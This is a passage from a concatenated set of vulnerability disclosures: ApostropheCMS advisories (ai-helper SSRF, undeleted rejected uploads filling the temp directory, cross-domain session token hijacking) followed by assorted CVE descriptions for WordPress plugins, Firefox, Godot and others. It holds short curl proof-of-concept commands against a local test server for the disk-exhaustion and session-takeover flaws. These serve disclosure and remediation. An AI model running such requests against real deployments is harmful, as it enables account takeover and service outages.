- Ownership and enumeration: `GET` and `DELETE` on these records are `userId`-scoped and cuid2 identifiers are unguessable, so the practical actor is the generating editor; this bounds the required privilege to a low-privileged authenticated user rather than an anonymous or cross-tenant attacker.
- Not a duplicate: the fix for the core pretty-URL SSRF advisory lives entirely in the separate `@apostrophecms/file` module and its stream proxy and never touches `packages/ai-helper`; the rich-text import SSRF advisory uses a different route with an explicit hostname allowlist. No advisory exists for `@apostrophecms/ai-helper`. This is a parallel unguarded sink, not an incomplete fix of either.

## Affected Versions

- `Ecosystem: npm`
- `Package: @apostrophecms/ai-helper`
- `Confirmed affected range: >= 1.0.0-beta.10, <= 1.0.0-beta.12`
- `Latest release checked: 1.0.0-beta.12 (npm registry, dist-tag latest)`
- `Fix status: not fixed`

The vulnerable pattern was introduced in `1.0.0-beta.10`: earlier releases through `1.0.0-beta.9` fetched the stored provider URL directly (`fetch(url)`) with no `req.baseUrl` resolution and no uploadfs-relative construction, so they are not affected by this pattern. Inspection of the published tarballs for `1.0.0-beta.10`, `1.0.0-beta.11`, and `1.0.0-beta.12` confirms the full chain (Host-derived base resolution, unguarded accept route, base64 insert without a stored url) is present and unchanged through the latest published release. This package publishes only on the prerelease (beta) channel, and the latest published version remains vulnerable.

## Suggested Fix

Do not treat `req.baseUrl` as a trusted origin for a server-side fetch. Enforce the same authorization on the accept route that the generate route applies, and add an ownership or scope check so a record can only be accepted by a user permitted to act on it. Independently, constrain the fetch target: resolve the storage-relative path against a server-configured, trusted base (for example the configured storage base URL) rather than the request-derived `req.baseUrl`, and reject or allowlist any resulting origin before calling `fetch`. Ensure the remediation covers both the base64 (no stored url) representation and the stored-url representation, and any other caller that reaches `aiHelperImageUrl` or `aiHelperFetchImage`. As an interim mitigation without a code change, configure a global base URL so the resolved origin is fixed, and place egress controls on the server so outbound requests cannot reach sensitive internal hosts or metadata endpoints.

Reported by zx (GitHub: @manus-pi).

### Summary

A rejected upload can remain in the operating system temporary directory.

Multer writes the file before its extension is checked, and the rejection path does not remove that temporary file. An unauthenticated requester can repeat this with large files and steadily consume temporary disk space.

### Details

The endpoint is:

```text
POST /api/v1/@apostrophecms/rich-text-widget/generate-csv-table
```

In `packages/apostrophe/modules/@apostrophecms/rich-text-widget/lib/apiRoutes.js`, Multer first writes the upload to `os.tmpdir()`. The handler then rejects filenames whose extension is not `csv`, but there is no cleanup of the Multer file on this error path.

The route does not require an authenticated user. A normal CSRF cookie is sufficient.

During testing, the request returned HTTP 400 with `Only csv files are supported`, while the complete uploaded content remained in a randomly named file in the configured temporary directory after the response.

### Relationship to prior public work

I reviewed [PR #5013](https://github.com/apostrophecms/apostrophe/pull/5013), which migrated the Rich Text CSV upload path from `connect-multiparty` to Multer. This report concerns cleanup after that migration: the rejected Multer file remains on disk, a behavior not described in the PR or its review discussion.

### POC

Create a small test file. A larger file can be used to demonstrate disk growth, but 1 MiB is enough for a safe local reproduction:

```bash
dd if=/dev/zero of=rejected.txt bs=1M count=1
```

Obtain the normal site cookies and send the rejected upload:

```bash
curl -c cookies.txt 'http://127.0.0.1:3000/' > /dev/null

curl -i -b cookies.txt \
  -F 'file=@rejected.txt;filename=rejected.txt;type=text/plain' \
  'http://127.0.0.1:3000/api/v1/@apostrophecms/rich-text-widget/generate-csv-table'
```

The response is HTTP 400. Compare the contents of the system temporary directory before and after the request:

```bash
ls -lt /tmp
```

A new randomly named file remains present and contains the uploaded bytes.

No login is required. Repeating the multipart request creates additional persistent temporary files.

### Impact

A remote unauthenticated attacker can fill the partition used by the operating system temporary directory. Once that partition is exhausted, Apostrophe and unrelated services on the same host may fail to upload files, create temporary data, or continue operating normally.

The attack requires only repeated HTTP requests and the stored files remain after each rejected response.

**Summary**
Apostrophe's cross-domain session migration emits a single-use session token as a URL query parameter and stores it in the Mongo cache. Any client that presents the token silently adopts the target user's full session (including `passport.user`) with no credentials.

**Details**
`packages/apostrophe/modules/@apostrophecms/i18n/index.js`:
- Token generation on cross-host/locale flows (L479–487) and passport-bridge cross-locale redirect (`passport-bridge/index.js` L557–593) places the token in the URL.
- `acceptCrossDomainSessionToken` (L258–298) reads `?aposCrossDomainSessionToken`, `Object.assign`s the stored session (cookie + `passport.user`) onto `req.session`, then nulls the cache entry under namespace `@apostrophecms/i18n:cross-domain-sessions`.
- Middleware without `before:` is registered for every URL (express `findModuleMiddlewareAndRoutes` L820–879); verified with `APOS_LOG_ALL_ROUTES=1`.

**PoC**
```
# 0) Anonymous baseline: admin-only draft → 403
# 1) Admin logs in legitimately (token minted into redirect URL):
curl -c admin.cookies -X POST -H "Content-Type: application/json" \
     --data '{"username":"admin","password":"adminpassword","session":true}' \
     http://localhost:3100/api/v1/@apostrophecms/login/login
# 2) Attacker with NO credentials visits the leaked token URL:
curl -c atk.cookies "http://localhost:3100/?aposCrossDomainSessionToken=HUNTING_TOKEN"
#    → 302 Location: / ; attacker now holds a vulnlab.sid SID cookie
# 3) Attacker reads admin-only content via adopted session:
curl -b atk.cookies ".../api/v1/@apostrophecms/page/d576242ve1dkzb12jiiabujd:en:draft"
#    → 200  adopted-session read -> Secret Private Page | secretData = TOP-SECRET-VALUE-abc123
# 4) Cache entry consumed (single-use): {"value":null}
```

**Impact**
Session hijack / account takeover of the migrated user for anyone who obtains the token, inheriting all the account's privileges. Exposure is realistic precisely because the token is in URLs: server/proxy/browser-access logs, browser history, and the Referer header when the destination host differs from the source (the intended use case). Single-use limits but does not remove the window.

**Remediation** — Deliver the token via a short-lived HttpOnly signed SameSite cookie rather than a query parameter; bind consumption to the exact source/destination host pair, expire in seconds, and never log it.

cwe.name: Use of GET Request Method With Sensitive Query Strings

cves.summary: Mozilla Firefox 0.9.2 allows web sites to set cookies for country-specific top-level domains, such as .ltd.uk, .plc.uk, and .sch.uk, which could allow remote attackers to perform a session fixation attack and hijack a user's HTTP session.  NOTE: it was later reported that 2.x is also affected.
Directory traversal vulnerability in pWins Webserver 0.2.5 and earlier allows remote attackers to read arbitrary files via Unicode characters.
Stack-based buffer overflow in the parse_field function in cgi_lib.c for LIBCGI 1.0.2 and 1.0.3 allows remote attackers to execute arbitrary code via a long argument.

Moby NetSuite allows remote attackers to cause a denial of service (crash) via an HTTP POST request with a (1) large integer or (2) non-numeric value in the Content-Length header, which causes an access violation after a failed atoi function call.

The Store Exporter – Export WooCommerce Products, Orders, Subscriptions, Customers plugin for WordPress is vulnerable to Directory Traversal in all versions up to, and including, 2.8.0 via the 'filename' parameter parameter. This makes it possible for authenticated attackers, with shop manager-level access and above, to read the contents of arbitrary files on the server, which can contain sensitive information.

The WP Inventory Manager plugin for WordPress is vulnerable to SQL Injection via the 'where' shortcode attribute of the [wpinventory] shortcode in versions up to, and including, 2.5.1. This is due to insufficient escaping on the user-supplied parameter and lack of sufficient preparation on the existing SQL query in the WPIMItem::get_all() function — parse_custom_where() only performs html_entity_decode(), strips semicolons, and does field-label name replacements, without using $wpdb->prepare() or a whitelist. The resulting string is concatenated into a raw SELECT statement that is executed via $wpdb->get_results(). This makes it possible for authenticated attackers, with Contributor-level access and above, to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database.

The WP Multi Store Locator Pro plugin for WordPress is vulnerable to generic SQL Injection via the 'store_locatore_search_radius' parameter in all versions up to, and including, 4.5.1 due to insufficient escaping on the user supplied parameter and lack of sufficient preparation on the existing SQL query. This makes it possible for unauthenticated attackers to append additional SQL queries into already existing queries that can be used to extract sensitive information from the database. The injection occurs in a numeric, unquoted SQL context, meaning WordPress's wp_magic_quotes() addslashes-based protection cannot neutralize the payload, and the AJAX handler is registered on wp_ajax_nopriv_make_search_request with no nonce or capability check, making it fully accessible without authentication.

The LatePoint – Calendar Booking Plugin for Appointments and Events plugin for WordPress is vulnerable to Insecure Direct Object Reference in all versions up to, and including, 5.6.3 via the LatePointAbilityDeleteBooking::execute due to missing validation on a user controlled key. This makes it possible for attackers, with  LatePoint Agent-level access and above, to read bookings and customer PII (full name, email, phone, and notes) assigned to other LatePoint agents, and delete arbitrary bookings by supplying any booking ID. This vulnerability is only exploitable when an administrator has enabled the Abilities API toggles (latepoint_abilities_api, latepoint_abilities_api_delete, and/or latepoint_abilities_api_edit) in the plugin settings.

The Booking Calendar plugin for WordPress is vulnerable to Privilege Escalation in all versions up to, and including, 11.8.2 via the `wpbc_ajax_option_save` AJAX action. The vulnerability exists because the `handle_ajax_save()` function applies per-option safeguards only to names explicitly registered via `register_option_policy()`, causing `get_option_policy()` to return an empty policy — bypassing all can_save, force_mode, and allowed_keys checks — for any unregistered option name, including core WordPress options, while an attacker-controlled `data_name` parameter passes through `sanitize_key()` and is written directly to `update_option()` without restriction. This makes it possible for authenticated attackers with Editor-level access and above to escalate their privileges to Administrator by writing core WordPress options such as `default_role=administrator` and `users_can_register=1`, then self-registering a new Administrator account. The nonce check does not meaningfully restrict this attack, as both the nonce value and nonce action are attacker-supplied POST parameters, and a valid nonce is trivially obtainable via `admin-ajax.php?action=rest-nonce`.

HCL BigFix Service Management is affected by a Server-Side Request Forgery (SSRF) vulnerability in its search functionality, which could allow an attacker to force the application server to send requests to internal systems that are not accessible from the internet.

The Mapster WP Maps plugin for WordPress is vulnerable to Arbitrary User Meta Write in all versions up to, and including, 1.23.0 via the `my_profile_update()` function. This is due to the function performing no nonce verification, no capability check, and no allowlist validation on the meta key supplied via the `acf-photo-gallery-groups` POST parameter before passing both the meta key and its corresponding value directly to `update_user_meta()`. This makes it possible for authenticated attackers, with Subscriber-level access and above, to update arbitrary user meta values, though privilege escalation is not possible.
Backdoor account in Interbase database server allows remote attackers to overwrite arbitrary files using stored procedures.

Godot Engine through 4.7.2 has a heap out-of-bounds write in the Radiance HDR (.hdr) image decoder (modules/hdr/image_loader_hdr.cpp). The run-length decoding loop expands RLE instructions read from the file into a buffer sized from the image dimensions, without validating that an instruction's repeat/copy count fits the remaining capacity of the row buffer. A crafted .hdr file therefore writes attacker-supplied bytes past the end of the heap allocation, with the overflow length and content controlled by the file. The defect is reached automatically when the product imports a crafted .hdr (e.g., when opening a project containing one), and at runtime in exported projects that load untrusted .hdr images. NOTE: the Supplier's position is that the research has identified "no security issues" because the required attacker access is outside of the current Godot Engine threat model.
